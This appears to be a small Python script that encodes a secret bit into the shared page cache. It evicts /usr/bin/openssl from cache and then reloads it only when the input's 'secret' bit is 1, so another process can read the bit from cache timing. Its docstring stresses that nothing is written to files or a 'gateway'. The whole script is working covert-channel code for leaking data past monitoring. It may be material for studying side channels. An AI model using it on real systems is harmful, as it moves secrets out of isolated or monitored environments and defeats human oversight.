"""Targeted shared-page-cache encoder; no file bytes or gateway messages are written."""
import json
import os
import sys

item = json.loads(sys.stdin.readline())
with open("/usr/bin/openssl", "rb") as target:
    # A file-specific hint, not a host-wide cache flush or a filesystem write.
    os.posix_fadvise(target.fileno(), 0, 0, os.POSIX_FADV_DONTNEED)
    if item["secret"] & 1:
        target.read()
